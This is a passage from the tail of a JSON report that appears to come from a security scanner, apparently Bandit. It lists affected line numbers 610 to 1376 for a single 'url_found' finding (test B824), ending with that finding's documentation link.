        610,
        611,
        612,
        613,
        614,
        615,
        616,
        617,
        618,
        619,
        620,
        621,
        622,
        623,
        624,
        625,
        626,
        627,
        628,
        629,
        630,
        631,
        632,
        633,
        634,
        635,
        636,
        637,
        638,
        639,
        640,
        641,
        642,
        643,
        644,
        645,
        646,
        647,
        648,
        649,
        650,
        651,
        652,
        653,
        654,
        655,
        656,
        657,
        658,
        659,
        660,
        661,
        662,
        663,
        664,
        665,
        666,
        667,
        668,
        669,
        670,
        671,
        672,
        673,
        674,
        675,
        676,
        677,
        678,
        679,
        680,
        681,
        682,
        683,
        684,
        685,
        686,
        687,
        688,
        689,
        690,
        691,
        692,
        693,
        694,
        695,
        696,
        697,
        698,
        699,
        700,
        701,
        702,
        703,
        704,
        705,
        706,
        707,
        708,
        709,
        710,
        711,
        712,
        713,
        714,
        715,
        716,
        717,
        718,
        719,
        720,
        721,
        722,
        723,
        724,
        725,
        726,
        727,
        728,
        729,
        730,
        731,
        732,
        733,
        734,
        735,
        736,
        737,
        738,
        739,
        740,
        741,
        742,
        743,
        744,
        745,
        746,
        747,
        748,
        749,
        750,
        751,
        752,
        753,
        754,
        755,
        756,
        757,
        758,
        759,
        760,
        761,
        762,
        763,
        764,
        765,
        766,
        767,
        768,
        769,
        770,
        771,
        772,
        773,
        774,
        775,
        776,
        777,
        778,
        779,
        780,
        781,
        782,
        783,
        784,
        785,
        786,
        787,
        788,
        789,
        790,
        791,
        792,
        793,
        794,
        795,
        796,
        797,
        798,
        799,
        800,
        801,
        802,
        803,
        804,
        805,
        806,
        807,
        808,
        809,
        810,
        811,
        812,
        813,
        814,
        815,
        816,
        817,
        818,
        819,
        820,
        821,
        822,
        823,
        824,
        825,
        826,
        827,
        828,
        829,
        830,
        831,
        832,
        833,
        834,
        835,
        836,
        837,
        838,
        839,
        840,
        841,
        842,
        843,
        844,
        845,
        846,
        847,
        848,
        849,
        850,
        851,
        852,
        853,
        854,
        855,
        856,
        857,
        858,
        859,
        860,
        861,
        862,
        863,
        864,
        865,
        866,
        867,
        868,
        869,
        870,
        871,
        872,
        873,
        874,
        875,
        876,
        877,
        878,
        879,
        880,
        881,
        882,
        883,
        884,
        885,
        886,
        887,
        888,
        889,
        890,
        891,
        892,
        893,
        894,
        895,
        896,
        897,
        898,
        899,
        900,
        901,
        902,
        903,
        904,
        905,
        906,
        907,
        908,
        909,
        910,
        911,
        912,
        913,
        914,
        915,
        916,
        917,
        918,
        919,
        920,
        921,
        922,
        923,
        924,
        925,
        926,
        927,
        928,
        929,
        930,
        931,
        932,
        933,
        934,
        935,
        936,
        937,
        938,
        939,
        940,
        941,
        942,
        943,
        944,
        945,
        946,
        947,
        948,
        949,
        950,
        951,
        952,
        953,
        954,
        955,
        956,
        957,
        958,
        959,
        960,
        961,
        962,
        963,
        964,
        965,
        966,
        967,
        968,
        969,
        970,
        971,
        972,
        973,
        974,
        975,
        976,
        977,
        978,
        979,
        980,
        981,
        982,
        983,
        984,
        985,
        986,
        987,
        988,
        989,
        990,
        991,
        992,
        993,
        994,
        995,
        996,
        997,
        998,
        999,
        1000,
        1001,
        1002,
        1003,
        1004,
        1005,
        1006,
        1007,
        1008,
        1009,
        1010,
        1011,
        1012,
        1013,
        1014,
        1015,
        1016,
        1017,
        1018,
        1019,
        1020,
        1021,
        1022,
        1023,
        1024,
        1025,
        1026,
        1027,
        1028,
        1029,
        1030,
        1031,
        1032,
        1033,
        1034,
        1035,
        1036,
        1037,
        1038,
        1039,
        1040,
        1041,
        1042,
        1043,
        1044,
        1045,
        1046,
        1047,
        1048,
        1049,
        1050,
        1051,
        1052,
        1053,
        1054,
        1055,
        1056,
        1057,
        1058,
        1059,
        1060,
        1061,
        1062,
        1063,
        1064,
        1065,
        1066,
        1067,
        1068,
        1069,
        1070,
        1071,
        1072,
        1073,
        1074,
        1075,
        1076,
        1077,
        1078,
        1079,
        1080,
        1081,
        1082,
        1083,
        1084,
        1085,
        1086,
        1087,
        1088,
        1089,
        1090,
        1091,
        1092,
        1093,
        1094,
        1095,
        1096,
        1097,
        1098,
        1099,
        1100,
        1101,
        1102,
        1103,
        1104,
        1105,
        1106,
        1107,
        1108,
        1109,
        1110,
        1111,
        1112,
        1113,
        1114,
        1115,
        1116,
        1117,
        1118,
        1119,
        1120,
        1121,
        1122,
        1123,
        1124,
        1125,
        1126,
        1127,
        1128,
        1129,
        1130,
        1131,
        1132,
        1133,
        1134,
        1135,
        1136,
        1137,
        1138,
        1139,
        1140,
        1141,
        1142,
        1143,
        1144,
        1145,
        1146,
        1147,
        1148,
        1149,
        1150,
        1151,
        1152,
        1153,
        1154,
        1155,
        1156,
        1157,
        1158,
        1159,
        1160,
        1161,
        1162,
        1163,
        1164,
        1165,
        1166,
        1167,
        1168,
        1169,
        1170,
        1171,
        1172,
        1173,
        1174,
        1175,
        1176,
        1177,
        1178,
        1179,
        1180,
        1181,
        1182,
        1183,
        1184,
        1185,
        1186,
        1187,
        1188,
        1189,
        1190,
        1191,
        1192,
        1193,
        1194,
        1195,
        1196,
        1197,
        1198,
        1199,
        1200,
        1201,
        1202,
        1203,
        1204,
        1205,
        1206,
        1207,
        1208,
        1209,
        1210,
        1211,
        1212,
        1213,
        1214,
        1215,
        1216,
        1217,
        1218,
        1219,
        1220,
        1221,
        1222,
        1223,
        1224,
        1225,
        1226,
        1227,
        1228,
        1229,
        1230,
        1231,
        1232,
        1233,
        1234,
        1235,
        1236,
        1237,
        1238,
        1239,
        1240,
        1241,
        1242,
        1243,
        1244,
        1245,
        1246,
        1247,
        1248,
        1249,
        1250,
        1251,
        1252,
        1253,
        1254,
        1255,
        1256,
        1257,
        1258,
        1259,
        1260,
        1261,
        1262,
        1263,
        1264,
        1265,
        1266,
        1267,
        1268,
        1269,
        1270,
        1271,
        1272,
        1273,
        1274,
        1275,
        1276,
        1277,
        1278,
        1279,
        1280,
        1281,
        1282,
        1283,
        1284,
        1285,
        1286,
        1287,
        1288,
        1289,
        1290,
        1291,
        1292,
        1293,
        1294,
        1295,
        1296,
        1297,
        1298,
        1299,
        1300,
        1301,
        1302,
        1303,
        1304,
        1305,
        1306,
        1307,
        1308,
        1309,
        1310,
        1311,
        1312,
        1313,
        1314,
        1315,
        1316,
        1317,
        1318,
        1319,
        1320,
        1321,
        1322,
        1323,
        1324,
        1325,
        1326,
        1327,
        1328,
        1329,
        1330,
        1331,
        1332,
        1333,
        1334,
        1335,
        1336,
        1337,
        1338,
        1339,
        1340,
        1341,
        1342,
        1343,
        1344,
        1345,
        1346,
        1347,
        1348,
        1349,
        1350,
        1351,
        1352,
        1353,
        1354,
        1355,
        1356,
        1357,
        1358,
        1359,
        1360,
        1361,
        1362,
        1363,
        1364,
        1365,
        1366,
        1367,
        1368,
        1369,
        1370,
        1371,
        1372,
        1373,
        1374,
        1375,
        1376
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
      "test_id": "B824",
      "test_name": "url_found"
    }
  ]
}